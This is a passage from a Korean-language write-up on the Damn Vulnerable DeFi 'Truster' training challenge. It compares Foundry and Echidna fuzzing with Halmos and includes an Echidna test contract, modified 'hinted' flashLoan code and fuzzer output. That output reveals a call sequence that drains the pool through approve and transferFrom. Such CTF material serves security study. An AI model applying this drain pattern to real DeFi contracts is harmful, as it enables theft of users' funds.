    │   ├─ emit Approval(owner: TrusterLenderPool: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], spender: 0x60CF39a6CcA10123Ee5Cb8d224CCde855be067CF, amount: 0)
...
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1644.57s (1644.57s CPU time)
```
`flashLoan()`->`approve()` 시퀀스의 모든 트랜잭션은 아무런 결과도 낳지 못했습니다. 왜냐하면 배포되지 않은 임의의 주소들이 항상 `to` 매개변수로 선택되었기 때문입니다. 힌트를 가지고 더 실험해 볼 수는 있겠지만, 제 생각에 그러한 퍼저 로직은 이미 너무 약합니다. 해결책이 존재하더라도, 허용 가능한 결과를 얻으려면 여전히 퍼저 로직을 많이 비틀어야 합니다.
그러니 다른 방법을 시도해 봅시다.

### Echidna
저는 또 다른 퍼징 엔진으로 Echidna를 선택했습니다. Echidna 스타일의 불변성 테스트 계약입니다:
```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterEchidna {
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    constructor() public payable {
        // 토큰 배포
        token = new DamnValuableToken();

        // 풀 배포 및 자금 조달
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
    
    }

    function echidna_testSolved() public returns (bool) {
        if (token.balanceOf(address(pool)) >= TOKENS_IN_POOL)
        {
            return true;
        }
        return false;
    }
}
```
config:
```javascript
deployer: '0xcafe0001'
sender: ['0xcafe0002']
allContracts: true
workers: 8
```
먼저, "깨끗한" **TrusterLenderPool**로 다시 시도해 봅시다:
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: passing
Unique instructions: 2864
Corpus size: 15
Seed: 5278472965973577621
```
불행히도 아무것도 없습니다. 아마 힌트를 주면 Echidna가 해결책을 찾을 수 있을까요? (두 번째 "힌트가 있는" `flashLoan()` 함수가 사용되었습니다):
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: failed!
  Call sequence:
    TrusterLenderPool.__flashLoan(1,0x62d69f6867a0a084c6d313943dc22023bc263691,true,0xcafe0002,1)
        DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
...
```
만세! 이 경우, **Echidna**는 불변 조건을 깨는 시퀀스를 실제로 찾았습니다. 하지만 우리는 여전히 퍼저에게 매우 큰 힌트를 주었습니다. 따라서 `flashLoan()` 하에서 수행될 수 있는 모든 가능한 호출을 고려해 봅시다 (적어도 설정에 있는 것들). 신사 숙녀 여러분, 프랑켄슈타인을 만나보세요:
```solidity
function __flashLoan(uint256 amount, address borrower,
                        bool is_token,
                        bool is_approve, address approve_to, uint256 approve_amount,
                        bool is_permit, address permit_owner, address permit_spender, 
                            uint256 permit_value, uint256 permit_deadline, uint8 permit_v,
                            bytes32 permit_r, bytes32 permit_s,
                        bool is_transfer, address transfer_to, uint256 transfer_amount,
                        bool is_transferFrom, address transferFrom_from, 
                            address transferFrom_to, uint256 transferFrom_amount
                        )
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    
    token.transfer(borrower, amount);
    //target이 token
    if (is_token) {
        if (is_approve) {
            token.approve(approve_to, approve_amount);
        }
        else if (is_permit) {
            token.permit(permit_owner, permit_spender, permit_value, 
                                        permit_deadline, permit_v,
                                        permit_r, permit_s);
        }
        else if (is_transfer) {
            token.transfer(transfer_to, transfer_amount);
        }
        else if (is_transferFrom) {
            token.transferFrom(transferFrom_from, transferFrom_to, transferFrom_amount);
        }
    }
    //target이 pool
    else {
        bytes memory data = ""; // 풀에 있는 유일한 함수는 어차피 nonReentrant입니다
        address(this).functionCall(data); // flashloan 자체를 호출
    }
    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }
    return true;
}
```
물론 컴파일되지 않습니다:
```javascript
$ forge build
...
Error: Compiler run failed:
Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:51):Stack too deep. ...
...
```
하지만 동일한 아이디어를 사용하여 다시 작성할 수 있습니다. `permit()`과 `flashLoan()` 호출은 어차피 호출할 수 없으므로 삭제합니다:
```solidity
function __flashLoan(uint256 amount, address borrower,
		    bool is_approve, bool is_transfer, bool is_tranferFrom,
		    address addr_param1, address addr_param2,
		    uint256 uint256_param1
		    )
	external
	nonReentrant
	returns (bool)
{
	uint256 balanceBefore = token.balanceOf(address(this));
	
	token.transfer(borrower, amount);
	if (is_approve == true) { // token.approve
	    token.approve(addr_param1, uint256_param1);
	}
	else if (is_transfer == true) { // token.transfer
	    token.transfer(addr_param1, uint256_param1);
	}
	else if (is_tranferFrom == true) { // token.transferFrom
	    token.transferFrom(addr_param1, addr_param2, uint256_param1);
	}
	if (token.balanceOf(address(this)) < balanceBefore) {
	    revert RepayFailed();
	}
	return true;
}
```
실행:
```javascript
$ forge build
...
$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
...
echidna_testSolved: failed!
  Call sequence:
    TrusterLenderPool.__flashLoan(0,0x0,true,false,false,0xcafe0002,0x0,40464368538165944492706300802628728086193014206184318198474034)
    DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
```
살아있다! 자, 이런 변화들로 우리는 퍼징이 어느 정도 허용 가능한 결과를 만들어내도록 관리했습니다.

## 결론
1. 때로는 공격에 한 번의 트랜잭션으로 충분하지 않습니다. 심볼릭하게 2개의 트랜잭션을 수행하는 것은 일반적으로 Halmos에서 가능합니다.
2. 심볼릭 테스트를 성공적으로 준비하기 위한 주요 조건 중 하나는 최대 경로 수가 커버되는지 확인하는 것입니다. 이 숫자를 단순히 늘릴 방법이 있다면 그렇게 해야 합니다!
3. 대상 계약에 변경이 필요하다면 주저하지 말고 변경하세요. 중요한 것은 결과에 영향을 주지 않도록 우리가 무엇을 하고 있는지 이해하는 것입니다.
4. 자동화 도구는 암호학적 함수를 잘 처리하지 못하므로 주의해야 합니다.
5. Foundry와 Echidna에서의 퍼징은 전달된 대상과 해당 데이터에 대한 호출이 있는 계약에서 매우 약한 모습을 보였습니다. 알려진 것에서 대상을 가져오고, 선택자와 필요한 매개변수에서 calldata를 구축하고 실행하는 것이 간단할 것 같았습니다. 하지만 이 도구들은 이것에 대처하지 못했습니다. 아마도 이것이 인터넷에서 퍼징을 사용하여 이 문제에 대한 해결책을 찾지 못한 이유일 것입니다. 퍼징을 위해 이러한 계약을 준비하는 것은 골치 아픈 일처럼 보입니다. 그리고 여기서 Halmos는 매우 편리한 도구임이 입증되었습니다.

## 다음 단계는?
이 시리즈의 다음 글은 [Naive-receiver](https://github.com/Burnnnnny/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver) 해결입니다.
